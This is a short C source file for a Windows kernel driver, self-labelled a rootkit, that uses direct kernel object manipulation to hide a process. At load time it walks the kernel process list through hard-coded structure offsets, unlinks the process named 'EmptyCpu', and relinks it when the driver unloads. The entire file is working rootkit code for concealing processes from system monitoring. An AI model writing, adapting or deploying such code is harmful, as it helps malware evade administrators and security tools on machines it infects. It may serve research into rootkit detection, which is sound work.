#include "dkomeprocess.h"

PLIST_ENTRY Remove_Entry = NULL;
NTSTATUS DE_Onload(IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath)
{
	PLIST_ENTRY list_node = (PLIST_ENTRY)(SYSPROCESS + 0x188);

	PCHAR process_name = "EmptyCpu";
	SIZE_T	length = strlen(process_name);
	do {
		if (*(PULONGLONG)((PUCHAR)list_node - 0x188 + 0x170) == 0) {
			PUCHAR image_process_name = (PUCHAR)list_node - 0x188 + 0x2e0;
			Ktrace("ROOTKIT: Process : %s", image_process_name);
			if (memcmp(image_process_name, process_name, length) == 0) {
				Remove_Entry = list_node;
				RemoveEntryList(list_node);
				Ktrace("ROOTKIT: RemoveEntryList : %llx-%s", (PULONGLONG)Remove_Entry, image_process_name);
			}
		}
		list_node = list_node->Flink;
	} while (SYSPROCESS != (PUCHAR)list_node - 0x188);

	return STATUS_SUCCESS;
}

VOID DE_OnUnload(IN PDRIVER_OBJECT DriverObject)
{
	if (Remove_Entry) {
		InsertTailList((PLIST_ENTRY)(SYSPROCESS + 0x188), Remove_Entry);
		Ktrace("ROOTKIT: InsertTailList : %llx", (PULONGLONG)Remove_Entry);
	}
}